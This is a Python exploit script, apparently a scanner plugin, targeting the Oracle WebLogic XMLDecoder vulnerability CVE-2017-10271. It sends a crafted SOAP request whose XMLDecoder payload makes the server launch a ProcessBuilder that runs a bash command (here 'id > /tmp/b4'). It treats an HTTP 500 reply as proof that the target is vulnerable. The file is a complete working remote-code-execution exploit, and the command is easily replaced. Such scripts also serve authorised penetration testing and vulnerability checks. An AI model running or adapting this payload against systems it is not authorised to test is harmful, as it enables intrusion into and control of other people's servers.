import requests
from lib.log import logger
from typing import Optional

def run(url: str) -> Optional[str]:
    """Exploit WebLogic XMLDecoder vulnerability (CVE-2017-10271)."""
    target_url = f"{url}:7001/wls-wsat/CoordinatorPortType"
    headers = {
        "Content-Type": "text/xml;charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    xml = """
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
            <soapenv:Header>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                    <java version="1.4.0" class="java.beans.XMLDecoder">
                        <void class="java.lang.ProcessBuilder">
                            <array class="java.lang.String" length="3">
                                <void index="0">
                                    <string>/bin/bash</string>
                                </void>
                                <void index="1">
                                    <string>-c</string>
                                </void>
                                <void index="2">
                                    <string>id > /tmp/b4</string>
                                </void>
                            </array>
                            <void method="start"/>
                        </java>
                    </work:WorkContext>
                </soapenv:Header>
            <soapenv:Body/>
        </soapenv:Envelope>"""
    try:
        logger.info(f"Sending XML payload to {target_url}")
        response = requests.post(target_url, headers=headers, data=xml, timeout=5, verify=False)
        if response.status_code == 500:
            logger.success("WebLogic XMLDecoder Vulnerable")
            return "WebLogic XMLDecoder Vulnerable"
        logger.warning(f"Failed, status code: {response.status_code}")
        return None
    except requests.RequestException as e:
        logger.error(f"Request failed: {str(e)}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return None

if __name__ == "__main__":
    print(run("http://192.168.27.128"))